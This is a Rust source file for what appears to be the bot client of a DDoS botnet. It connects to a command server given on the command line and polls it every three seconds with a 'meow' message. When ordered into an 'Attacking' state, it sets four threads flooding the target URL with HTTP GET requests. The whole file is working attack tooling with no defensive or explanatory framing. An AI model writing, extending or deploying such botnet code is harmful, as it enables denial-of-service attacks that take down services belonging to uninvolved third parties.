use std::{env, io::{Read, Write}, net::TcpStream, process, sync::{Arc, RwLock}, thread::{self, sleep}, time::Duration};

use astolfo::FemState;

fn main() {
    let address = env::args().nth(1).unwrap();
    let config = bincode::config::standard();

    let mut stream = TcpStream::connect(address).unwrap_or_else(|err| {
        eprintln!("[\x1b[911mERR\x1b[0m] Failed to connect ({err})");
        process::exit(1);
    });

    println!("[\x1b[92mSUCC\x1b[0m] Connection established to server");

    let mut prev_state = FemState::Idle;
    let working_state = Arc::new(RwLock::new(FemState::Idle));

    for _ in 0..4 {
        let thread_state = Arc::clone(&working_state);
        thread::spawn(move || {
            loop {
                let state = thread_state.read().unwrap(); 
                match &*state {
                    FemState::Idle => {
                        sleep(Duration::from_secs(3));
                    },
                    FemState::Attacking(addr) => {
                        reqwest::blocking::get(addr).unwrap();
                        sleep(Duration::from_millis(10));
                    },
                    _ => {}
                };
            }
        });
    }

    loop {
        let hello_msg = b"meow";
        let hello_size : [u8; 2] = (hello_msg.len() as u16).to_be_bytes();

        if let Err(_) = stream.write_all(&hello_size) {
            eprintln!("[\x1b[911mERR\x1b[0m] Lost connection to server");
            process::exit(1);
        }

        if let Err(_) = stream.write_all(hello_msg) {
            eprintln!("[\x1b[911mERR\x1b[0m] Lost connection to server");
            process::exit(1);
        }

        let mut size_buf = [0u8; 2];
        if let Err(_) = stream.read_exact(&mut size_buf) {
            eprintln!("[\x1b[911mERR\x1b[0m] Lost connection to server");
            process::exit(1);
        }

        let size = u16::from_be_bytes(size_buf);
        let mut state = vec![0u8; size as usize];

        stream.read_exact(state.as_mut_slice()).unwrap_or_else(|_| {
            eprintln!("[\x1b[911mERR\x1b[0m] Lost connection to astolfo");
            process::exit(1);
        });

        let cmd = bincode::decode_from_slice::<FemState, _>(state.as_slice(), config);

        match cmd {
            Ok((cmd, _)) => {
                if cmd != prev_state {
                    match cmd {
                        FemState::Idle => {
                            let mut write_guard = working_state.write().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
                            *write_guard = FemState::Idle;
                            prev_state = FemState::Idle;
                            println!("[\x1b[94mINFO\x1b[0m] Set workers to idle");
                        },
                        FemState::Attacking(addr) => {
                            let mut write_guard = working_state.write().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
                            *write_guard = FemState::Attacking(addr.clone());
                            prev_state = FemState::Attacking(addr);
                            println!("[\x1b[94mINFO\x1b[0m] Set workers to attack");
                        },
                        _ => {}
                    }
                }
            },
            Err(_) => {}
        }

        sleep(Duration::from_secs(3));

    }
}

